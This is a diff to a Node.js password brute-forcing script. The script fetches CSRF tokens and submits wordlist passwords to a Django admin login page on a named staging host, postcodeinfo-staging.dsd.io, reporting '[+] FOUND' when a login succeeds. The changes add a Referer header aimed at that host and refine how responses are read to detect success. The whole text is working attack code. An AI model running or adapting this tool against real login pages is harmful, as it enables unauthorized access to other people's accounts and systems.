@@ -51,8 +51,6 @@ var getCSRF = function(callback) {
   });
 };
 
-console.log(words)
-
 // Main Loop
 async.each(words, function(word, callback) {
 
@@ -65,6 +63,7 @@ async.each(words, function(word, callback) {
       url: baseUrl + '/login/',
       method: 'POST',
       headers: { 
+        Referer: 'https://postcodeinfo-staging.dsd.io/admin/login/?next=/admin/',
         Cookie: 'csrftoken=' + token 
       },
       form: {
@@ -79,17 +78,20 @@ async.each(words, function(word, callback) {
     request(loginOptions, function (error, response, body) {
       if (!error) {
         // If we match known regex password is incorrect
-        if (body.match(ERROR_1) || body.match(ERROR_2)) {
+        if ( response.statusCode === 200 && (body.match(ERROR_1) || body.match(ERROR_2))) {
           console.log('[-] Invalid: ' + word);
-        } else {
+        } else if (response.statusCode < 500) {
           console.log(
             '[+] FOUND: ' + word  +
             '\n[+] Shutting down....' 
           );
 
           process.exit();
-        }
+        } 
+      } else {
+          console.log(error);
       }
+      
       callback();
     });
   });
